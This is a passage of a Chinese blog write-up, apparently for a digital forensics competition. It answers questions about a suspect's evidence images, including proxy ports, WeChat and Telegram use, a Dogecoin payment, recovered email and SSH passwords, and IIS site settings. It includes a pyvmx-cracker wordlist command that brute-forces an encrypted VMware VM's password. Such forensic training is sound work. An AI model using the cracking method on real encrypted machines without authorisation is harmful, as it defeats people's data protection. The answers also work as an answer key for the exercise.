&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721173144057.png&#34; alt=&#34;image-20250721173144057&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;登录的端口和之前看到的代理端口一致&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;8091
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;16接15题该端口上运行的进程的程序名称program-name为&#34;&gt;16.接15题，该端口上运行的进程的程序名称（Program name）为
&lt;/h2&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721174150761&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721174150761.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721174150761.png&#34; alt=&#34;image-20250721174150761&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-proxy
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;17嫌疑人从检材2上访问该网站时所使用的域名为&#34;&gt;17.嫌疑人从检材2上访问该网站时，所使用的域名为
&lt;/h2&gt;&lt;p&gt;下面就是对应域名（同样是代理登录8091端口）：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721174349012&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721174349012.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721174349012.png&#34; alt=&#34;image-20250721174349012&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; www.sdhj.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;18检材2-中嫌疑人所使用的微信id是&#34;&gt;18.检材2 中，嫌疑人所使用的微信ID是
&lt;/h2&gt;&lt;p&gt;检材二的电脑里面并没有安装微信&lt;/p&gt;
&lt;p&gt;但在检材二嵌套证据识别部分能看见一个ios手机备份，查看路径能发现是在分区三下&lt;/p&gt;
&lt;p&gt;把当前文件夹下的所有文件导出作为文件集合作为新检材分析，发现里面有微信号：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721174735568&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721174735568.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721174735568.png&#34; alt=&#34;image-20250721174735568&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sstt119999
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;19分析检材2嫌疑人为推广其网站与广告位供应商沟通时使用的通联工具的名称为&#34;&gt;19.分析检材2，嫌疑人为推广其网站，与广告位供应商沟通时使用的通联工具的名称为
&lt;/h2&gt;&lt;p&gt;接上一步，创建出来的ios镜像不完整，找不到题目要求的信息&lt;/p&gt;
&lt;p&gt;真正的做法是使用同样位于分区三下的另一个镜像：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721181840122&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721181840122.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721181840122.png&#34; alt=&#34;image-20250721181840122&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这样就能发现沟通工具：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721182359181&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721182359181.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721182359181.png&#34; alt=&#34;image-20250721182359181&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;telegram
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;20分析检材2嫌疑人使用虚拟货币与供应商进行交易该虚拟货币的名称是&#34;&gt;20.分析检材2，嫌疑人使用虚拟货币与供应商进行交易，该虚拟货币的名称是
&lt;/h2&gt;&lt;p&gt;在上题聊天记录中找到一张收款码图片，用的是狗狗币DOGE&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721202916041&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721202916041.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721202916041.png&#34; alt=&#34;image-20250721202916041&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DOGE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;21上述交易中对方的收款地址是&#34;&gt;21.上述交易中，对方的收款地址是
&lt;/h2&gt;&lt;p&gt;见上图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DPBEgbwap7VW5HbNdGi9TyKJbqTLWYYkvf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;22上述交易中嫌疑人和供应商的交易时间是&#34;&gt;22.上述交易中，嫌疑人和供应商的交易时间是
&lt;/h2&gt;&lt;p&gt;这里不知道怎么写，wp说可以通过Dogecoin浏览器使用交易地址搜索到交易：
&lt;a class=&#34;link&#34; href=&#34;https://explorer.coinex.com/doge&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://explorer.coinex.com/doge
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721203900017&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721203900017.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721203900017.png&#34; alt=&#34;image-20250721203900017&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2020-09-20 12:19:46
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;23上述交易中嫌疑人支付货币的数量为&#34;&gt;23.上述交易中，嫌疑人支付货币的数量为
&lt;/h2&gt;&lt;p&gt;见上题图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;4000
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;24检材2中嫌疑人使用的虚拟机的虚拟磁盘被加密其密码为&#34;&gt;24.检材2中，嫌疑人使用的虚拟机的虚拟磁盘被加密，其密码为
&lt;/h2&gt;&lt;p&gt;虚拟机在嵌套证据识别中就已经见过，导出备用，这里以防万一我导出了整个存放虚拟机的文件夹：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721204531657&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721204531657.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721204531657.png&#34; alt=&#34;image-20250721204531657&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721204542772&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721204542772.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721204542772.png&#34; alt=&#34;image-20250721204542772&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;微信聊天记录里说他忘记了密码，要去github上找办法：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721204217267&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721204217267.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721204217267.png&#34; alt=&#34;image-20250721204217267&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;之前翻看浏览器的时候就看见了github网页，我们也看看那个破解工具网站：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721204314206&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721204314206.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721204314206.png&#34; alt=&#34;image-20250721204314206&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721204359596&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721204359596.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721204359596.png&#34; alt=&#34;image-20250721204359596&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-v&lt;/code&gt;指定虚拟机，-&lt;code&gt;d&lt;/code&gt;指定字典，就使用它演示使用的这条命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 pyvmx-cracker.py -v Windows10x64.vmx -d wordlist.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到密码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;zzzxxx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;25检材2中嫌疑人发送给广告商的邮件中的图片附件的-sha256值为忽略邮件状态&#34;&gt;25.检材2中，嫌疑人发送给广告商的邮件中的图片附件的 SHA256值为(忽略邮件状态)
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;下面的步骤建议直接导入火眼证据分析，使用虚拟机反而徒增麻烦&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;打开虚拟机，发现有密码：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721211503013&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721211503013.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721211503013.png&#34; alt=&#34;image-20250721211503013&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;办法是使用火眼仿真，仿真完毕就会给出密码&lt;/p&gt;
&lt;p&gt;不过在此之前，我们要先给虚拟机的加密给取消：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721210943728&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721210943728.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721210943728.png&#34; alt=&#34;image-20250721210943728&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;再次使用火眼仿真就能得到密码：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721211734059&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721211734059.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721211734059.png&#34; alt=&#34;image-20250721211734059&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;之前聊天记录提到广告使用邮件发送，在桌面的邮箱软件的草稿箱找到广告图片：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721212136090&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721212136090.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721212136090.png&#34; alt=&#34;image-20250721212136090&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;保存到桌面，使用&lt;code&gt;certutil&lt;/code&gt;计算sha256（这个版本的powershell没有&lt;code&gt;getfilehash&lt;/code&gt;）：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721212946356&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721212946356.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721212946356.png&#34; alt=&#34;image-20250721212946356&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cc7ea3ab90ab6b28417e08c715c243ce58ea76d71fd141b93f055a58e9ba561a
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;26检材2中嫌疑人给广告商发送广告图片邮件的发送时间是忽略邮件状态&#34;&gt;26.检材2中，嫌疑人给广告商发送广告图片邮件的发送时间是(忽略邮件状态)
&lt;/h2&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721213202654&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721213202654.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721213202654.png&#34; alt=&#34;image-20250721213202654&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2020-09-20 12:53
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;27检材2中嫌疑人的邮箱密码是&#34;&gt;27.检材2中，嫌疑人的邮箱密码是
&lt;/h2&gt;&lt;p&gt;把.vmdk文件作为镜像文件导入成新检材（早知道能导入我就不那么别扭使用虚拟机了气死我了）：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721214556696&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721214556696.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721214556696.png&#34; alt=&#34;image-20250721214556696&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;honglian7001
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;28检材2中嫌疑人使用了什么远程管理工具登录了检材1所在的服务器&#34;&gt;28.检材2中，嫌疑人使用了什么远程管理工具，登录了检材1所在的服务器？
&lt;/h2&gt;&lt;p&gt;Xshell不是全称，具体名称在安装软件中看，或者虚拟机里面也能看见：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721215345779&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721215345779.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721215345779.png&#34; alt=&#34;image-20250721215345779&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Xshell6
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;29检材2中嫌疑人使用上述工具连接服务器时使用的登录密码为&#34;&gt;29.检材2中，嫌疑人使用上述工具连接服务器时，使用的登录密码为
&lt;/h2&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721214738761&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721214738761.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721214738761.png&#34; alt=&#34;image-20250721214738761&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;qwer1234!@#$
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;part3&#34;&gt;part3
&lt;/h1&gt;&lt;h2 id=&#34;30检材3-的原始磁盘-sha256-值为&#34;&gt;30.检材3 的原始磁盘 SHA256 值为
&lt;/h2&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721221147933&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721221147933.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721221147933.png&#34; alt=&#34;image-20250721221147933&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FF593FCCB3770B8845A3334631F8E80807638EE722C5AA7B34E877589857C3BA
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;31检材3-所在的计算机的操作系统版本是&#34;&gt;31.检材3 所在的计算机的操作系统版本是
&lt;/h2&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250721221243364&#34; href=&#34;http://picture.928330.xyz/typora/image-20250721221243364.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250721221243364.png&#34; alt=&#34;image-20250721221243364&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Windows Server 2008 HPC Edition x64
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;32检材3中部署的网站名称是&#34;&gt;32.检材3中，部署的网站名称是
&lt;/h2&gt;&lt;p&gt;火眼仿真检材三（一定记得把密码重置成空！！！）&lt;/p&gt;
&lt;p&gt;登录server账号，打开服务器管理器：角色 -&amp;gt; web服务器 -&amp;gt; internet信息服务 -&amp;gt; win -&amp;gt; 网站&lt;/p&gt;
&lt;p&gt;可以看到有一个托管的网站：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250724230707575&#34; href=&#34;http://picture.928330.xyz/typora/image-20250724230707575.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250724230707575.png&#34; alt=&#34;image-20250724230707575&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;card
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;33检材3中部署的网站对应的网站根目录是&#34;&gt;33.检材3中，部署的网站对应的网站根目录是
&lt;/h2&gt;&lt;p&gt;高级设置：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250724231932289&#34; href=&#34;http://picture.928330.xyz/typora/image-20250724231932289.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250724231932289.png&#34; alt=&#34;image-20250724231932289&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:\inetpub\wwwroot\v7w
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;34检材3中部署的网站绑定的端口是&#34;&gt;34.检材3中，部署的网站绑定的端口是
&lt;/h2&gt;&lt;p&gt;同上图：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;35检材3中具备登陆功能的代码页对应的文件名为&#34;&gt;35.检材3中，具备登陆功能的代码页，对应的文件名为
&lt;/h2&gt;&lt;p&gt;右侧导航栏浏览，发现一个名为web的配置文件：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725103519074&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725103519074.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725103519074.png&#34; alt=&#34;image-20250725103519074&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;使用记事本打开，可以看见里面有两条疑似与login相关的配置：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725103655367&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725103655367.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725103655367.png&#34; alt=&#34;image-20250725103655367&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;分别查看两个文件，发现都跟登录有关：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250725112751376&#34; href=&#34;http://picture.928330.xyz/typora/image-20250725112751376.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250725112751376.png&#34; alt=&#34;image-20250725112751376&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
